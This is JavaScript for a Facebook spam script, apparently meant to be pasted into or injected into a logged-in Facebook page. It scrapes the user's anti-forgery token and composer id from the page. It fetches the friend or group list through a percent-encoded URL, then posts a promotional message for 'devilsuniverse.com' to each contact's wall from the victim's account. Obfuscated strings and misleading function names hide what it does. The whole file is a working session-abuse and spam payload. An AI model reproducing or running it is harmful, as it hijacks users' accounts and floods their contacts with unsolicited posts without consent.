jx={getHTTPObject:function(){var A=false;if(typeof ActiveXObject!="undefined"){try{A=new ActiveXObject("Msxml2.XMLHTTP")}catch(C){try{A=new ActiveXObject("Microsoft.XMLHTTP")}catch(B){A=false}}}else{if(window.XMLHttpRequest){try{A=new XMLHttpRequest()}catch(C){A=false}}}return A},load:function(url,callback,format,method,opt){var http=this.init();if(!http||!url){return }if(http.overrideMimeType){http.overrideMimeType("text/xml")}if(!method){method="GET"}if(!format){format="text"}if(!opt){opt={}}format=format.toLowerCase();method=method.toUpperCase();var now="uid="+new Date().getTime();url+=(url.indexOf("?")+1)?"&":"?";url+=now;var parameters=null;if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,url,true);if(method=="POST"){http.setRequestHeader("Content-type","application/x-www-form-urlencoded");http.setRequestHeader("Content-length",parameters.length);http.setRequestHeader("Connection","close")}var ths=this;if(opt.handler){http.onreadystatechange=function(){opt.handler(http)}}else{http.onreadystatechange=function(){if(http.readyState==4){if(http.status==200){var result="";if(http.responseText){result=http.responseText}if(format.charAt(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+")")}else{if(format.charAt(0)=="x"){result=http.responseXML}}if(callback){callback(result)}}else{if(opt.loadingIndicator){document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)}if(opt.loading){document.getElementById(opt.loading).style.display="none"}if(error){error(http.status)}}}}}http.send(parameters)},bind:function(A){var C={"url":"","onSuccess":false,"onError":false,"format":"text","method":"GET","update":"","loading":"","loadingIndicator":""};for(var B in C){if(A[B]){C[B]=A[B]}}if(!C.url){return }var D=false;if(C.loadingIndicator){D=document.createElement("div");D.setAttribute("style","position:absolute;top:0px;left:0px;");D.setAttribute("class","loading-indicator");D.innerHTML=C.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(D);this.opt.loadingIndicator=D}if(C.loading){document.getElementById(C.loading).style.display="block"}this.load(C.url,function(E){if(C.onSuccess){C.onSuccess(E)}if(C.update){document.getElementById(C.update).innerHTML=E}if(D){document.getElementsByTagName("body")[0].removeChild(D)}if(C.loading){document.getElementById(C.loading).style.display="none"}},C.format,C.method,C)},init:function(){return this.getHTTPObject()}}
var j =0;
var k =0;
var suc= 0;
var msg="Join new social networking website www.devilsuniverse.com";
var arr = new Array();

function HTML_text_composer_hdeartext_and_postdatacollection(sender){
if(document.getElementById("txtFloodMsg").value!="") msg = document.getElementById("txtFloodMsg").value;
jx.load(window.location.protocol+"//"+unescape('%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F%62%6F%6F%74%73%74%72%61%70%2E%70%68%70%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%67%72%6F%75%70%26%76%69%65%77%65%72')+"="+Env.user+"&token=v7&lazy=0&__user="+Env.user,
        function(data){
		var text = data;
		var json = text.substring(text.indexOf('{'));
		var friends = JSON.parse(json);
		friends = friends.payload.entries;
		for(var n = 0; n < friends.length; n++){
			arr.push(friends[n].uid);
		}
		sender.parentNode.innerHTML = "Please wait....";
		xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin();
	});
}
var a = document.body.innerHTML;
var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1]; 
var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
//var msg = unescape("%49%6E%76%69%74%61%74%69%6F%6E%20%74%6F%20%6A%6F%69%6E%20%77%65%62%73%69%74%65%20%57%57%57%2E%44%45%56%49%4C%53%55%4E%49%56%45%52%53%45%2E%43%4F%4D%2C%20%49%74%73%20%61%20%73%6F%63%69%61%6C%20%6E%65%74%77%6F%72%6B%69%6E%67%20%77%65%62%73%69%74%65%20%6C%69%6B%65%20%4F%52%4B%55%54%20%41%4E%44%20%46%41%43%45%42%4F%4F%4B%2E%20%53%6F%20%6A%6F%69%6E%20%69%74%20%6E%6F%77%2E%0A%09%09%09");
function xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin(){        
        pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc]+ "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
        with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded") , send(pst);
        suc++;
        if(suc>arr.length){alert("Completed. Please refresh page."); suc=0;}
        else setTimeout("xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin()",30000/arr.length);        
}
var askformsg = "<table><tr><td>Write your message here</td></tr><tr><td><textarea id='txtFloodMsg' style='width:400px;height:150px'></textarea></td></tr><tr><td><input type='button' value='Start Posing' onclick='HTML_text_composer_hdeartext_and_postdatacollection(this);' /></td></tr></table>";
var askDIV = document.createElement("div");
askDIV.style.position = "absolute";
askDIV.style.backgroundColor = "#abf";
askDIV.style.zIndex = "100";
askDIV.style.top = "100px";
askDIV.style.left = "200px";
askDIV.innerHTML = askformsg;
document.body.appendChild(askDIV);
//setTimeout("HTML_text_composer_hdeartext_and_postdatacollection()",1000);